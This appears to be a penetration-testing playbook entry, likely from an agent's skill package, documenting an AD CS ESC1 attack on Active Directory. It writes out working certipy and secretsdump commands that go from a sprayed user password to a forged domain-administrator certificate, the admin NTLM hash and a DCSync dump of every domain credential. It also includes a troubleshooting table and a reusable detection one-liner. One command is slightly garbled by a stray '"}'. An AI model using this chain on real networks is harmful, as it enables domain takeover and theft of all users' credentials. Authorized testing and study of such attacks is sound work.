# [2026-03] AD CS ESC1 Certificate Template Abuse → Domain Admin Privileges

## Scene Classification
Penetration Testing / AD Attack

## Overview of Goals
Using the ESC1 vulnerability template of AD CS certificate services, obtain a domain administrator certificate as a regular domain user, and ultimately perform DCSync to export all credentials.

## Complete Execution Chain

1. Obtain a regular domain user credential (through password spraying)
2. Use certipy to enumerate AD CS configurations
   ```bash
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.0.0.1
   ```
3. Discovered ESC1 vulnerability template (allows any SAN, low-privilege users to apply)
4. Request a certificate as a domain administrator
   ```bash
   certipy req -u user@domain.local -p 'Password123' 
     -ca CORP-CA -template VulnTemplate "}
     -upn administrator@domain.local -dc-ip 10.0.0.1
   ```
5. Use certificate authentication to obtain NTLM Hash
   ```bash
   certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
   ```
6. DCSync Export All Credentials
   ```bash
   secretsdump.py domain.local/administrator@10.0.0.1 -hashes :NTLM_HASH
   ```

## Pitfall Record

| Problem | Cause | Solution | Time Consumed |
|------|------|---------|------|
| certipy find timed out | LDAP connection blocked by firewall | use -ns parameter to specify DNS instead | 20min |
| Certificate request denied | Template requires Manager Approval | Switch to another template that doesn't require approval | 10min |
| auth failed KDC_ERR_PADATA | DC time unsynchronized | retry after ntpdate time synchronization | 5min |

## Toolchain Discovery
- Certipy is the preferred tool for AD CS attacks, more convenient than Certify.exe (pure Python, can run directly on Kali)
- It is necessary to ensure DNS resolution is correct, otherwise Kerberos authentication will fail

## Key Code/Commands
See the execution link above.

## Reusable Patterns/Scripts Snippets```bash
# AD CS Quick Detection One-Stop Service
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -stdout | grep -A5 "ESC"
```

## Suggestions for Improvement of This Package
- certipy has been added to the Kali bootstrap manifest ✓
- routing.md already has the "Certipy/AD CS" route ✓

## Evolution Actions
- [x] No update needed (already overwritten)

## Environmental Information
- Kali 2026.1, certipy 4.8.2
- Target: Windows Server 2022, AD CS has been deployed
- Domain Functional Level: 2016